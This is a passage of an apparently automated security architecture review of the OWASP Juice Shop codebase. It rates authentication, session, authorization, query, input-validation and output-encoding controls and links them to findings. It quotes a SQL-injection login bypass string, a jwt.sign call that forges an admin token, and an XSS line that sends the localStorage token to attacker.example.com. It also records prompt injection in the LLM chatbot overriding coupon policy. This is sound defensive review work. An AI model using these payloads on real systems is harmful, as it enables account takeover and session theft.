| Uploaded Files (FTP Directory / File Upload<br/>Endpoint) | Internal | User-uploaded files stored in the ftp/<br/>directory and served statically. The upload<br/>endpoint at POST `/file-upload` accepts<br/>arbitrary file types with weak validation.<br/>Files may include exploit payloads<br/>(XXE-laden XMLs, malicious SVGs). The ftp/<br/>directory is world-readable via directory<br/>listing in challenge scenarios. |
| Chat Messages and LLM Interaction Data | Internal | User chat messages sent to the LLM chatbot<br/>via Socket\.IO, and LLM-generated responses.<br/>Messages are forwarded unfiltered to the<br/>configurable LLM backend endpoint.<br/>Potentially contains sensitive user queries<br/>or PII if users disclose personal<br/>information in chat. LLM response content is<br/>not sanitized before rendering. |

## 6. Security Architecture

This chapter is organized by security-control category. The architecture section avoids artificial control IDs and finding-ID columns in overview tables. Findings are listed only where the affected control is described.

_[§6](#6-security-architecture) schema v2 (13-section control-category layout). Cataloged controls: 42 total - 3 adequate, 16 partial, 8 weak, 4 unsafe, 11 missing. Linked threats: 63._

**How to read the verdicts.** Every control category (and every sub-control below it) carries exactly one status. The two red verdicts do **not** mean the same thing - this is the distinction that decides what you have to do about a finding:

| Status | Meaning | What it asks of you |
|----------|------------------------------------|------------------------|
| 🟢 Adequate | Control is present and sound | Nothing - keep it |
| 🟡 Partial | Present, but with meaningful gaps | Close the gap |
| 🟠 Weak | Present, but has exploitable gaps | Strengthen it |
| 🔴 Unsafe | **Present and relied upon, but defeated /<br/>trivially bypassable** | **Fix the existing control** |
| 🔴 Missing | **Control was never built** | **Add the control** |
| - | Not applicable to this codebase | - |

So "🔴 Unsafe" on a control category does *not* mean the control is absent - it means the control exists but does not hold (e.g. an `MD5` password hash, a raw-SQL query path, a hardcoded signing key). "🔴 Missing" is reserved for controls that were never built (e.g. no Content-Security-Policy header).

### 6.2 Identity and Authentication Controls

<a id="ctrl-identity-and-authentication-controls"></a>

**Dependent crossings:** [tb-1](#tb-1) refuted - 🔴 [F-006](#f-006) — Insecure JWT Verification, 🔴 [F-048](#f-048) — Missing Authentication on Web3 Challenge Routes · [tb-2](#tb-2) refuted - 🔴 [F-005](#f-005) — Hardcoded RSA Private Key (`lib/insecurity.ts:21`) · [tb-4](#tb-4) unconfirmed - 🔴 [F-059](#f-059) — Container image signing via cosign or attest-build-provenance


**Systemic weaknesses:** [W-004](#w-004)
**Verdict:** 🔴 Unsafe

<!-- The line below is mechanically derived from the controls table — LLM must not re-author it. -->
**Controls covered:**

- [6.2.1 Password-Based Authentication](#password-based-authentication)
- [6.2.2 Social Login Adapter](#social-login-adapter)
- [6.2.3 Multi-Factor Authentication](#multi-factor-authentication)

**Implemented controls:** Password-based login via local credential verification, optional TOTP-based 2FA via `speakeasy`, Google OAuth identity adapter in the Angular frontend, per-IP rate limiting via Express middleware on the login endpoint.

**Assessment:** Authentication is the most severely compromised boundary in this codebase. SQL injection at `routes/login.ts:34` allows unauthenticated callers to bypass credential verification entirely. The RSA private key used to sign session tokens is committed to the repository, defeating post-authentication trust. Password hashing uses unsalted `MD5`, making any database breach immediately actionable. The TOTP enrollment and intermediate-token handling introduce additional gaps detailed below. Each successful flow terminates in the server issuing a session token; the signing, validation, propagation, storage, and lifecycle of that token are described in [§6.3 Session and Token Controls](#63-session-and-token-controls).

<a id="password-based-authentication"></a>
#### 6.2.1 Password-Based Authentication

**Status:** 🔴 Unsafe - password login is bypassable via SQL injection at `routes/login.ts:34`, and stored credentials use unsalted `MD5`.

`routes/login.ts` handles credential verification for all password-based logins, matching the supplied email and password against the SQLite user table via a direct Sequelize query call. Password registration goes through the Finale-generated CRUD endpoint on `server.ts`, and password reset is handled by `routes/resetPassword.ts`.


```mermaid
sequenceDiagram
    participant U as User
    participant FE as Frontend
    participant API as Backend
    U->>FE: Initiate Password-Based Authentication
    FE->>API: Submit credentials / token
    API->>API: Verify and establish identity
    API-->>FE: Result (success / failure)
```
**Security assessment**

The login query concatenates `req.body.email` directly into a SQL string at `routes/login.ts:34`, making the entire authentication step bypassable with `' OR '1'='1'--`. Beyond injection:

- Passwords are stored as unsalted `MD5` at `lib/insecurity.ts:41`, allowing rainbow-table recovery of any credential once the SQLite file is read.
- Password reset in `routes/resetPassword.ts:35` accepts a security question answer as the only factor; no one-time link or email verification is sent.
- The password change route in `routes/changePassword.ts` issues the request via HTTP GET, logging the new password in web server access logs and browser history.

**Relevant findings**

- 🔴 [F-006](#f-006) — Insecure JWT Verification — JWT algorithm confusion defeats the session established after a successful password login, meaning a fixed login path still leaves the resulting session open to forgery.
- 🟠 [F-014](#f-014) — Security Question-Only Password Reset — Security question-only password reset bypasses the password control entirely with a guessable knowledge factor.
- 🟠 [F-029](#f-029) — Weak Password Hash MD5 without Salt — Unsalted MD5 at `lib/insecurity.ts:41` makes stored passwords recoverable from the database file without per-user salt resistance.

<a id="social-login-adapter"></a><a id="social-login-adapter-oauth"></a>
#### 6.2.2 Social Login Adapter

**Status:** 🔴 Unsafe - the frontend OAuth adapter derives a deterministic local password from the user's Google email address, allowing account takeover without OAuth interaction.

`oauth.component.ts` implements Google OAuth as a purely frontend identity adapter. It reads the access token from the redirect URL, calls Google's userinfo endpoint to obtain the user's email, derives a local password deterministically from that email string, creates a local account if one does not exist, and calls `/rest/user/login` with those credentials to obtain a local session JWT.

The diagram shows how the frontend OAuth adapter terminates in the same local login flow as password authentication:

```mermaid
sequenceDiagram
    autonumber
    actor User
    participant SPA as oauth.component.ts
    participant Google as Google UserInfo API
    participant API as /rest/user/login
    participant JWT as JWT Issuer (lib/insecurity.ts)

    User->>SPA: Return from OAuth redirect (access token in URL fragment)
    SPA->>Google: GET userinfo with access token
    Google-->>SPA: Email address
    SPA->>API: POST /rest/user (create account if absent)
    SPA->>API: POST /rest/user/login (email + derived password)
    API->>JWT: Sign RS256 JWT for authenticated user
    API-->>SPA: JWT stored to localStorage
```

**Security assessment**

`oauth.component.ts:30` computes the local password as a deterministic function of the email string. Any caller who knows a target's email address can reproduce the same password and authenticate directly against `/rest/user/login` without involving Google. The OAuth flow additionally uses the implicit grant (`login.component.ts:148`), which exposes the access token in the URL fragment and omits the `state` parameter, leaving the authorization response open to CSRF. The resulting session inherits all JWT signing and storage weaknesses from [§6.3](#63-session-and-token-controls).

**Relevant findings**

- 🔴 [F-006](#f-006) — Insecure JWT Verification — Insecure JWT verification affects every session established by this flow, including OAuth-originated ones.
- 🟠 [F-014](#f-014) — Security Question-Only Password Reset — The security question reset path is equally reachable for accounts created through OAuth, as they share the same local user model.
- 🟠 [F-029](#f-029) — Weak Password Hash MD5 without Salt — The derived local password is hashed with unsalted MD5, providing no additional resistance if the user table is read.

<a id="multi-factor-authentication"></a><a id="multi-factor-authentication-totp"></a>
#### 6.2.3 Multi-Factor Authentication

**Status:** 🟡 Partial - TOTP enrollment and verification are implemented, but 2FA is optional, the pre-auth intermediate token is stored in localStorage, and the verification endpoint is unrate-limited.

TOTP-based 2FA is available to all users through a QR-code enrollment flow backed by `speakeasy`. When an account has 2FA enabled, the login flow issues a short-lived intermediate token after password verification and requires a TOTP code before issuing the full session JWT.

The diagram shows the intended 2FA verification path following a successful password login:

```mermaid
sequenceDiagram
    autonumber
    actor User
    participant SPA as login.component.ts
    participant API as routes/2fa.ts
    participant JWT as JWT Issuer (lib/insecurity.ts)

    User->>SPA: Submit email + password
    SPA->>API: POST /rest/user/login (credentials)
    API-->>SPA: 401 with tmpToken (stored to localStorage)
    User->>SPA: Enter TOTP code
    SPA->>API: POST /rest/2fa/verify (tmpToken + TOTP)
    API->>JWT: Verify TOTP code via speakeasy
    JWT-->>API: TOTP valid
    API-->>SPA: Full session JWT (stored to localStorage)
```

**Security assessment**

Enrollment and TOTP verification function correctly, but three structural gaps reduce the effective strength of this control:

- The intermediate pre-authentication token is written to `localStorage` at `login.component.ts:120` alongside the full JWT, making it exfiltrable by the same XSS payloads that target the session token.
- TOTP secrets are stored as plaintext string columns in `models/user.ts:29`, so a database breach yields all enrolled TOTP seeds without any additional cracking step.
- The `/rest/2fa/verify` endpoint at `routes/2fa.ts:16` has no rate limit, allowing unlimited TOTP guesses against the 6-digit window.

**Relevant findings**

- 🔴 [F-006](#f-006) — Insecure JWT Verification — Insecure JWT verification means the full session JWT issued after 2FA passes is itself forgeable, negating the second factor's value.
- 🟠 [F-014](#f-014) — Security Question-Only Password Reset — The password reset path at `routes/resetPassword.ts:35` does not require a 2FA challenge, providing a bypass route for accounts with 2FA enrolled.
- 🟠 [F-029](#f-029) — Weak Password Hash MD5 without Salt — Unsalted MD5 password hashing weakens the first factor that 2FA is meant to supplement.

<a id="authentication-rate-limiting"></a>
**Authentication Rate Limiting.**


**Status:** 🟡 Partial - a per-IP rate limiter exists on the login endpoint, but the key is derived from a client-controlled header that any attacker can forge.

`server.ts` registers an Express rate-limiting middleware that tracks request counts by client IP address and applies a threshold to the login and password-reset endpoints. The IP is read from the `X-Forwarded-For` or `True-Client-IP` headers when present.

**Security assessment**

The rate limiter key is derived from `X-Forwarded-For` at `server.ts:346` and from the `True-Client-IP` header via `lib/insecurity.ts:93`, both of which are client-controlled. Setting `X-Forwarded-For: 1.2.3.4` on each request cycles the bucket, giving unlimited login attempts with no per-account throttle. The 2FA verification endpoint at `routes/2fa.ts:16` has no separate rate limit, leaving TOTP codes open to brute-force across the 30-second window.

**Relevant findings**

- 🔴 [F-006](#f-006) — Insecure JWT Verification — JWT algorithm confusion provides a path to forged sessions that bypasses the rate limiter entirely, since it does not touch the login endpoint.
- 🟠 [F-014](#f-014) — Security Question-Only Password Reset — The password reset endpoint shares the same spoofable rate-limit mechanism, offering unlimited security-question guesses.
- 🟠 [F-029](#f-029) — Weak Password Hash MD5 without Salt — Unsalted MD5 hashing means offline cracking of a captured hash is faster than online brute-force, making the rate limiter the wrong place to rely for credential protection.

### 6.3 Session and Token Controls

<a id="ctrl-session-and-token-controls"></a>

**Dependent crossings:** [tb-1](#tb-1) refuted - 🔴 [F-006](#f-006) — Insecure JWT Verification, 🔴 [F-048](#f-048) — Missing Authentication on Web3 Challenge Routes · [tb-2](#tb-2) refuted - 🔴 [F-005](#f-005) — Hardcoded RSA Private Key (`lib/insecurity.ts:21`) · [tb-4](#tb-4) unconfirmed - 🔴 [F-059](#f-059) — Container image signing via cosign or attest-build-provenance

**Verdict:** 🔴 Unsafe

<!-- The line below is mechanically derived from the controls table — LLM must not re-author it. -->
**Controls covered:**

- [6.3.1 Session Token Signing](#session-token-signing)
- [6.3.2 Session Token Storage](#session-token-storage)
- [6.3.3 Session Token Revocation](#session-token-revocation)
- [6.3.4 Session Token Expiry](#session-token-expiry)

**Implemented controls:** `RS256`-signed JWTs issued by `lib/insecurity.ts` on every successful login, with an 8-hour `exp` claim enforced by `jsonwebtoken` on each verification call.

**Assessment:** This application uses a single locally-signed token format (commonly called JWT) for every authenticated session, regardless of the login flow in [§6.2](#62-identity-and-authentication-controls) that established it. The sub-sections below trace one token through its lifecycle: signing on issuance, validation on every protected request, storage in the browser, manual revocation, and time-based expiry. The `RS256` algorithm choice is sound, but every other stage of the lifecycle is broken: the signing key is committed to the repository, the verification routine accepts algorithm downgrades, tokens are stored in JavaScript-accessible localStorage, no server-side revocation store exists, and the only expiry mechanism is the client-readable `exp` claim.

<a id="session-token-signing"></a><a id="session-token-signing-jwt-based"></a>
#### 6.3.1 Session Token Signing

**Status:** 🔴 Unsafe - the `RS256` private key is hardcoded in `lib/insecurity.ts:21` and committed to the public repository, allowing anyone to mint valid tokens for any identity.

`RS256`-signed JWTs are issued by `lib/insecurity.ts` on every successful login. The private key is loaded from the module at import time as a multiline string literal, and the `jsonwebtoken` library signs the token payload with it before returning the JWT to the client.

**Security assessment**

The RSA private key embedded at `lib/insecurity.ts:21` is readable from the public repository. Any party with a copy of that key can call `jwt.sign({data: {role: 'admin', email: 'admin@juice-sh.op'}}, privateKey, {algorithm: 'RS256'})` and produce a token the server accepts as genuine - no login required. The verification path at `lib/insecurity.ts:52-56` additionally does not pin the accepted algorithm, so an attacker who supplies a token with `alg: HS256` signed with the corresponding public key (also publicly available) achieves the same result via algorithm confusion.

**Relevant findings**

- 🔴 [F-001](#f-001) — JWT and 2FA Temporary Token Stored in localStorage — JWT storage in localStorage means a stolen token grants full session access; the signing defect means the token can also be minted from scratch without stealing one.

<a id="session-token-storage"></a><a id="session-token-storage-browser-localstorage"></a>
#### 6.3.2 Session Token Storage

**Status:** 🟠 Weak - JWTs are written to `localStorage` at `login.component.ts:101`, where any script in the same origin can read them, including the confirmed XSS sinks in the SPA.

`login.component.ts:101` calls `localStorage.setItem('token', authentication.token)` on every successful login. The Angular `HttpClient` interceptor reads back this value and attaches it as a `Bearer` header on all subsequent API requests. The 2FA pre-auth token is stored in the same location at `login.component.ts:120`.

**Security assessment**

Browser `localStorage` is accessible to any JavaScript executing in the page's origin. The confirmed `bypassSecurityTrustHtml()` sinks at `search-result.component.ts:143` and `administration.component.ts:91` run in the same origin as the token store. A single reflected XSS click that executes `fetch('https://attacker.example.com/?t='+localStorage.getItem('token'))` exfiltrates the JWT and both 2FA tokens in one request. An `HttpOnly; Secure` cookie would make this impossible; `localStorage` offers no equivalent isolation from script.

**Relevant findings**

- 🔴 [F-001](#f-001) — JWT and 2FA Temporary Token Stored in localStorage — Confirms that `login.component.ts:101` stores the JWT in `localStorage` alongside the 2FA pre-auth token, exposing both to XSS exfiltration.

<a id="session-token-revocation"></a>
#### 6.3.3 Session Token Revocation

**Status:** 🔴 Missing - logout clears `localStorage` client-side but issues no server-side invalidation; the JWT remains valid until its `exp` claim lapses.

Token revocation requires a server-side store (deny-list keyed on `jti`, or a short-lived session store) that the verification middleware consults on each request. No such store is present in this codebase.

**Security assessment**

`localStorage.removeItem('token')` on logout removes the credential from the browser, but the JWT itself is still accepted by every protected API route for the remaining window of its 8-hour `exp` claim. An attacker who has copied the token via XSS, network capture, or log exposure retains access until expiry. Password changes and role changes do not invalidate outstanding tokens because there is no mechanism to enumerate or cancel them server-side.

**Relevant findings**

- 🔴 [F-001](#f-001) — JWT and 2FA Temporary Token Stored in localStorage — The confirmed localStorage storage pattern means tokens copied by an XSS payload or network observer remain valid for up to 8 hours with no server-side cancel path.

<a id="session-token-expiry"></a>
#### 6.3.4 Session Token Expiry

**Status:** 🟡 Partial - JWTs carry an 8-hour `exp` claim that `jsonwebtoken` enforces, but there is no idle timeout and no server-side session state to enforce either independently.

JWTs issued by `lib/insecurity.ts` include an `exp` claim set to 8 hours from issuance. The `jsonwebtoken` verification call in the middleware rejects tokens whose `exp` has passed.

**Security assessment**

The 8-hour ceiling is the only expiry defence. No idle timeout shortens the window for inactive sessions. Because all session state lives in the client-held JWT, the server cannot distinguish an active from an idle session and has no mechanism to terminate either early. A token stolen at minute 1 of an 8-hour window remains valid for the remaining 7 hours and 59 minutes regardless of user activity.

**Relevant findings**

- 🔴 [F-001](#f-001) — JWT and 2FA Temporary Token Stored in localStorage — The 8-hour localStorage-stored token window directly determines how long a stolen session credential remains exploitable.

The diagram shows the JWT lifecycle from issuance through browser storage to API presentation and expiry:

```mermaid
sequenceDiagram
    autonumber
    actor User
    participant SPA as login.component.ts
    participant API as Protected Route (server.ts)
    participant Verify as lib/insecurity.ts (verify)
    participant Issuer as lib/insecurity.ts (sign)

    User->>SPA: Successful login
    SPA->>Issuer: sign(payload, privateKey, RS256, exp=8h)
    Issuer-->>SPA: Signed JWT
    SPA->>SPA: localStorage.setItem('token', jwt)
    User->>SPA: Navigate to protected page
    SPA->>API: GET /rest/resource (Authorization: Bearer jwt)
    API->>Verify: verify(token) - no algorithm pin
    Verify-->>API: Decoded payload (or 401 if expired)
    API-->>SPA: Protected resource
```

### 6.4 Authorization Controls

<a id="ctrl-authorization-controls"></a>

**Dependent crossings:** [tb-1](#tb-1) refuted - 🔴 [F-003](#f-003) — Missing Authentication Middleware on Sensitive Routes, 🔴 [F-013](#f-013) — Mass Assignment via Finale Auto-Generated CRUD API (`server.ts`), 🟠 [F-019](#f-019) — Zip-Slip via File Upload ZIP Extraction (`routes/fileUpload.ts`) · [tb-4](#tb-4) unconfirmed - 🟠 [F-031](#f-031) — GitHub Actions workflow-level permissions block, 🟠 [F-044](#f-044) — Excessive GITHUB_TOKEN Scope from Missing Permissions Blocks in 11 Workflows, 🟡 [F-061](#f-061) — GITHUB_TOKEN scope minimization


**Systemic weaknesses:** [W-002](#w-002)
**Verdict:** 🔴 Missing

<!-- The line below is mechanically derived from the controls table — LLM must not re-author it. -->
**Controls covered:**

- [6.4.1 Centralized Authorization Policy](#centralized-authorization-policy)
- [6.4.2 Object-Level Ownership Check](#object-level-ownership-check)
- [6.4.3 Management Endpoint Protection](#management-endpoint-protection)

**Implemented controls:** `security.isAuthorized()` and `security.isAdminAuthenticated()` middleware from `lib/insecurity.ts` are applied to a subset of admin and order routes. Angular route guards in `app.guard.ts` provide client-side access control for the SPA.

**Assessment:** Server-side authorization is applied sporadically. `isAuthorized()` exists and is used on some routes, but the majority of data-mutating REST endpoints in `server.ts` omit it entirely. No route scope-limits returned or mutated data to records owned by the authenticated caller. Angular client-side guards (`app.guard.ts:52`) are bypassed by any direct API request. The combination of missing middleware and absent ownership checks means an authenticated user can read and modify any other user's orders, addresses, and payment data.

<a id="centralized-authorization-policy"></a>
#### 6.4.1 Centralized Authorization Policy

**Status:** 🟠 Weak - `isAuthorized()` exists and is wired to some routes, but at least 19 route registrations in `server.ts` omit it, leaving sensitive operations ungated.

`lib/insecurity.ts` exports `isAuthorized()` and `isAdminAuthenticated()` middleware that validates the Bearer JWT and asserts the required role. These are passed as Express middleware arguments on individual route registrations in `server.ts`.

**Security assessment**

Route registrations at `server.ts:607-667` include admin configuration (`server.ts:607`), chat (`server.ts:638`), and data access endpoints with no middleware guard before the handler. The `/rest/admin/` path prefix creates an expectation of access control that the code does not implement at the router level - there is no blanket guard on the prefix. Angular guards at `app.guard.ts:52` check for a JWT in localStorage but perform no role assertion and are trivially bypassed by a direct API call.

**Relevant findings**

- 🔴 [F-003](#f-003) — Missing Authentication Middleware on Sensitive Routes — Confirms that multiple `/rest/admin/` and sensitive data endpoints in `server.ts` are registered without `isAuthorized()` middleware.
- 🔴 [F-010](#f-010) — Insecure Direct Object Reference — IDOR across address, order, and payment routes shows that even routes that do call `isAuthorized()` do not bind the authenticated identity to the resource.
- 🔴 [F-013](#f-013) — Mass Assignment via Finale Auto-Generated CRUD API — Mass assignment at the Finale-generated CRUD endpoint allows callers to set the `role` field on their own user record, escalating privilege through a missing field-level authorization check.

<a id="object-level-ownership-check"></a>
#### 6.4.2 Object-Level Ownership Check

**Status:** 🔴 Missing - data routes accept caller-supplied object IDs and fetch or mutate the named record without comparing the record's owner to the authenticated caller's identity.

REST endpoints for basket items, addresses, payments, orders, and wallet data accept an identifier from the URL path or request body and pass it directly to Sequelize `findByPk` or `update` calls.

**Security assessment**

Routes including `routes/address.ts:11`, `routes/basketItems.ts:68`, `routes/payment.ts:21`, `routes/orderHistory.ts:36`, and `routes/wallet.ts:12` extract an ID from the request and query or mutate the record without asserting `record.UserId === req.user.id`. Integer auto-increment primary keys in `models/user.ts:39` make enumeration trivial - incrementing an orderId by 1 reads the next user's order. The data export route at `routes/dataExport.ts:26` similarly does not scope the export to the requesting user's data.

**Relevant findings**

- 🔴 [F-003](#f-003) — Missing Authentication Middleware on Sensitive Routes — Missing authentication middleware on routes that also lack ownership checks means some IDOR endpoints are reachable without any valid session.
- 🔴 [F-010](#f-010) — Insecure Direct Object Reference — Confirms multiple IDOR instances across address, basket, order, payment, and wallet routes with no ownership assertion.
- 🔴 [F-013](#f-013) — Mass Assignment via Finale Auto-Generated CRUD API — Mass assignment through the Finale endpoint shows the same pattern: caller-supplied fields reach the persistence layer without an authorization gate.

<a id="management-endpoint-protection"></a>
#### 6.4.3 Management Endpoint Protection

**Status:** 🟡 Partial - some admin routes carry `isAdminAuthenticated()`, but several admin-prefixed endpoints have no guard, and the Prometheus metrics endpoint is world-accessible.

`server.ts` registers routes under `/rest/admin/` and several operational endpoints. A subset of these use `isAdminAuthenticated()` from `lib/insecurity.ts` to assert that the caller holds the admin role in their JWT.

**Security assessment**

`GET /rest/admin/application-configuration` at `server.ts:607` and `GET /rest/admin/application-version` at `server.ts:606` carry no middleware guard, returning the full application configuration and version to any unauthenticated caller. The Prometheus metrics endpoint at `server.ts:676` is similarly unguarded, exposing runtime counters and internal labeling to the open internet. Routes that are guarded rely on `isAdminAuthenticated()` checking the JWT role claim - a claim forgeable from the committed private key at `lib/insecurity.ts:21`.

**Relevant findings**

- 🔴 [F-003](#f-003) — Missing Authentication Middleware on Sensitive Routes — Unauthenticated access to admin and management routes is directly confirmed at `server.ts:607` and `server.ts:676`.
- 🔴 [F-010](#f-010) — Insecure Direct Object Reference — IDOR findings demonstrate that authenticated-but-misauthorized access succeeds on adjacent routes, showing authorization depth is insufficient even where middleware is present.
- 🔴 [F-013](#f-013) — Mass Assignment via Finale Auto-Generated CRUD API — Mass assignment on the registration endpoint allows privilege escalation that then uses the management endpoints with a self-issued admin role.

### 6.5 Query Construction and Data Access Controls

<a id="ctrl-query-construction-and-data-access-controls"></a>

**Dependent crossings:** [tb-5](#tb-5) refuted - 🔴 [F-004](#f-004) — SQL Injection on Login (`routes/login.ts:34`), 🔴 [F-008](#f-008) — SQL Injection


**Systemic weaknesses:** [W-001](#w-001)
**Verdict:** 🟠 Weak

<!-- The line below is mechanically derived from the controls table — LLM must not re-author it. -->
**Controls covered:**

- [6.5.1 ORM / Parameterized Queries](#orm-parameterized-queries)

**Implemented controls:** Sequelize ORM backs the majority of relational data access, using bound parameters for standard model method calls (`Model.findOne()`, `Model.update()`, `Model.create()`).

**Assessment:** Most database operations use Sequelize model methods that bind parameters correctly. Two critical routes - login and product search - bypass the ORM and concatenate user input directly into `models.sequelize.query()` calls, introducing SQL injection at the most-exposed endpoints. A third path passes a user-controlled MongoDB-style selector to the product review update route.

<a id="orm-parameterized-queries"></a><a id="orm-parameterized-queries-sequelize"></a>
#### 6.5.1 ORM / Parameterized Queries

**Status:** 🟡 Partial - Sequelize model methods provide parameterized queries throughout most of the codebase, but the login and search routes call raw `models.sequelize.query()` with string-concatenated user input.

Sequelize models back all standard CRUD operations. `Model.findOne()`, `Model.findAll()`, and related methods pass values as bound parameters through the ORM's query builder. Two routes step outside this pattern by calling `models.sequelize.query()` directly.

**Security assessment**

The login lookup at `routes/login.ts:34` and the product search at `routes/search.ts:23` both concatenate user-controlled strings into raw SQL without escaping or binding. The product review update at `routes/updateProductReviews.ts:18` passes a user-controlled object into a MarsDB selector, accepting MongoDB-style operator keys where a scalar `id` value is the only valid input.

The vulnerable login lookup builds the query as a raw string with user input interpolated:

```ts
models.sequelize.query(`SELECT * FROM Users WHERE email = '${email}' AND password = '${password}' AND deletedAt IS NULL`)
```

**Relevant findings**

- 🔴 [F-004](#f-004) — SQL Injection on Login — SQL injection in the login query at `routes/login.ts:34` allows authentication bypass without a valid password.
- 🔴 [F-008](#f-008) — SQL Injection — SQL injection in the product search at `routes/search.ts:23` allows arbitrary data exfiltration from the SQLite schema.
- 🔴 [F-024](#f-024) — NoSQL Injection in Product Review Mass-Update — NoSQL injection in the product review mass-update at `routes/updateProductReviews.ts:18` allows operators like `$where` to reach the MarsDB query engine.

### 6.6 Input Boundary Validation Controls

<a id="ctrl-input-boundary-validation-controls"></a>

**Dependent crossings:** [tb-1](#tb-1) unconfirmed - 🔴 [F-008](#f-008) — SQL Injection, 🔴 [F-009](#f-009) — Remote Code Execution via safeEval in B2B Order API (`routes/b2bOrder.ts`), 🔴 [F-011](#f-011) — Prompt Injection overrides coupon discount policy (`routes/chat.ts:179`), +7 · [tb-2](#tb-2) refuted - 🔴 [F-004](#f-004) — SQL Injection on Login (`routes/login.ts:34`) · [tb-4](#tb-4) unconfirmed - 🟠 [F-025](#f-025) — Remote Script Execution via Unverified Installer (`ci.yml:358`), 🟠 [F-032](#f-032) — Third-party GitHub Actions pinned to commit SHA

**Verdict:** 🟠 Weak

<!-- The line below is mechanically derived from the controls table — LLM must not re-author it. -->
**Controls covered:**

- [6.6.1 Validation Approach](#validation-approach)
- [6.6.2 File Upload Constraints](#file-upload-constraints)

**Implemented controls:** `multer` middleware enforces a file-size ceiling on multipart uploads. Angular template bindings provide client-side form validation on structured input fields.

**Assessment:** Input validation is ad-hoc and absent on most server routes. No centralized schema validation middleware (e.g., `zod`, `joi`, `express-validator`) is registered at the Express layer. The B2B order route passes user input to a sandboxed code evaluator. The data erasure route constructs file paths from user-supplied values without path normalization. The LLM chat endpoint is exposed without authentication and imposes no prompt-length constraint.

<a id="validation-approach"></a>
#### 6.6.1 Validation Approach

**Status:** 🟠 Weak - individual route handlers perform ad-hoc field checks, but user-supplied values reach a sandboxed evaluator, an LLM endpoint, and file-path construction without structural validation.

Individual route handlers coerce types and check for required fields. No shared validation schema or middleware validates request bodies against a defined contract before they reach business logic.

**Security assessment**

Three specific gaps make the absence of centralized validation exploitable:

- `routes/b2bOrder.ts:23` passes a user-supplied string to `safeeval`, a JavaScript sandbox with known escape vectors, allowing code execution in the Node\.js process.
- `routes/dataErasure.ts:104` constructs a file path from a user-controlled value without normalizing it against a base directory, enabling traversal outside the intended target tree.
- The LLM chat endpoint at `server.ts:638` is accessible without authentication and applies no length or structure constraint to prompt input, creating a resource exhaustion surface.

**Relevant findings**

- 🔴 [F-011](#f-011) — Prompt Injection overrides coupon discount policy — Prompt injection at `routes/chat.ts:179` confirms that user-supplied text reaches the LLM system context without sanitization, allowing policy override via crafted messages.
- 🟠 [F-041](#f-041) — Missing Rate Limiting on LLM Chat Endpoint — No rate limit on the chat endpoint at `server.ts:638` allows unlimited token consumption from any unauthenticated caller.
- 🟡 [F-063](#f-063) — Unbounded In-Memory Set Growth Without Rate Limiting — Unbounded in-memory set growth on the Web3 challenge endpoint shows the same pattern: user-supplied input drives resource allocation without a size cap.

<a id="file-upload-constraints"></a>
#### 6.6.2 File Upload Constraints

**Status:** 🟡 Partial - `multer` limits file size on multipart uploads, but content type validation is absent and archive entry paths are not normalized before extraction.

File uploads are handled by `multer` middleware configured with a maximum file size. The upload handler in `routes/fileUpload.ts` routes accepted files to content-specific processors based on the detected file type.

**Security assessment**

`multer` enforces the size limit, which is the only enforced constraint. Archive entries extracted by `unzipper` at `routes/fileUpload.ts:31` are not stripped of `../` path components before writing to disk, allowing a crafted ZIP to write files outside the upload directory (zip-slip). The XML branch at `routes/fileUpload.ts:76` passes the file to `libxml2-wasm` with external entity processing enabled, allowing an uploaded document to trigger server-side file reads or SSRF via `SYSTEM` entities.

**Relevant findings**

- 🔴 [F-011](#f-011) — Prompt Injection overrides coupon discount policy — Prompt injection through the chat interface is the same class of unsanitized user-input-to-trusted-sink problem as the upload handlers, sharing the absent-validation root cause.
- 🟠 [F-041](#f-041) — Missing Rate Limiting on LLM Chat Endpoint — Absence of token-budget limits on the LLM endpoint parallels the absent content-type enforcement on uploads — both allow unrestricted resource consumption from user-supplied content.
- 🟡 [F-063](#f-063) — Unbounded In-Memory Set Growth Without Rate Limiting — Web3 endpoint in-memory growth from unauthenticated calls illustrates the same missing size-cap pattern seen in the file upload path.

### 6.7 Output Encoding and Rendering Controls

**Verdict:** 🟠 Weak

<!-- The line below is mechanically derived from the controls table — LLM must not re-author it. -->
**Controls covered:**

- [6.7.1 Template Sanitization](#template-sanitization)
- [6.7.2 sanitize-html Library](#sanitize-html-library)

**Implemented controls:** Angular's template engine escapes dynamic bindings by default in all standard interpolation contexts. `sanitize-html` is applied in the product description rendering path.

**Assessment:** Angular's default escaping is bypassed at a minimum of 15 call sites that pass user-controlled content through `DomSanitizer.bypassSecurityTrustHtml()`. These bypasses create a reflected and stored XSS surface that, combined with JWT storage in `localStorage`, converts any triggered XSS payload into a full account-takeover step.

<a id="template-sanitization"></a><a id="template-sanitization-angular"></a>
#### 6.7.1 Template Sanitization

**Status:** 🟠 Weak - Angular's default sanitization is explicitly bypassed via `bypassSecurityTrustHtml()` at multiple locations in the SPA, including the search results view.

Angular's template engine sanitizes all `[innerHTML]` bindings by default, stripping active content. `DomSanitizer.bypassSecurityTrustHtml()` marks a value as trusted HTML, causing Angular to render it verbatim into the DOM without sanitization.

**Security assessment**

`search-result.component.ts:143` calls `bypassSecurityTrustHtml()` on the decoded search query value and binds it to `[innerHTML]`, reflecting the raw URL parameter into the DOM. `administration.component.ts:91` and `data-export.component.ts:71` apply the same pattern to user-controlled content. Because the session JWT is in `localStorage`, any injected script that executes in the SPA origin can call `localStorage.getItem('token')` and exfiltrate the full session in a single fetch.

**Relevant findings**

- 🔴 [F-027](#f-027) — Cross-Site Scripting — Confirmed XSS at `search-result.component.ts:143` via `bypassSecurityTrustHtml()`, providing a concrete session-theft vector given localStorage token storage.

<a id="sanitize-html-library"></a>
#### 6.7.2 sanitize-html Library

**Status:** 🟠 Weak - `sanitize-html` strips outright dangerous tags but is configured to allow attributes that can carry active content in certain browser rendering contexts.

`sanitize-html` is applied to product description content before it is rendered in HTML context in the application. It operates as an allowlist-based filter that removes tags and attributes not on its permitted list.

**Security assessment**

The sanitizer configuration permits a broader attribute set than a minimal safe allowlist for user-supplied content. While `<script>` tags are removed, attributes such as `style` and some event-adjacent properties remain permitted, and modern browsers can interpret certain CSS or attribute combinations as script-execution vectors in inline HTML. The control provides meaningful filtering, but the configuration does not meet the strict minimum needed for content that will be rendered inside authenticated sessions without a CSP fallback.

**Relevant findings**

- 🔴 [F-027](#f-027) — Cross-Site Scripting — The XSS finding encompasses both the `bypassSecurityTrustHtml()` bypasses and the insufficiently strict sanitizer configuration, both of which allow script injection into authenticated page contexts.

### 6.8 Browser and Cross-Origin Controls

**Verdict:** 🔴 Missing

<!-- The line below is mechanically derived from the controls table — LLM must not re-author it. -->
**Controls covered:**

